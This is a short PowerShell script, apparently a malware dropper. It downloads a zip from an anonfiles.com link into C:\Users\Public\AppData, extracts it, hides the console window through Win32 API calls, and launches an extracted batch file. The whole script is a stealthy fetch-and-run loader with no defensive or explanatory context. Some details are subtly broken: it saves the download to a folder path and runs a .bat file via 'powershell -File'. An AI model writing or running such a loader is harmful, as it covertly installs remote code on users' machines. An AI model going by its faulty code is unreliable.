# Set the URL of the file to download
$downloadUrl = "https://cdn-145.anonfiles.com/ub32Leraz0/89a06ad8-1684288710/HELP.zip"

# Set the path where the downloaded file will be saved
$downloadPath = "C:\Users\Public\AppData"

# Set the path where the files will be extracted
$extractPath = "C:\Users\Public\AppData"

# Set the path of the file to run after extraction
$fileToRun = "C:\Users\Public\AppData\2.bat"

# Download the file
Invoke-WebRequest -Uri $downloadUrl -OutFile $downloadPath

# Unzip the downloaded file to the specified directory
Expand-Archive -Path $downloadPath -DestinationPath $extractPath

# Hide the PowerShell window
Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();

[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

public static void Hide()
{
   IntPtr hWnd = GetConsoleWindow();
   if (hWnd != IntPtr.Zero)
   {
      ShowWindow(hWnd, 0);
   }
}
'
[Console.Window]::Hide()

# Run the specified file
Start-Process powershell.exe -ArgumentList "-File $fileToRun"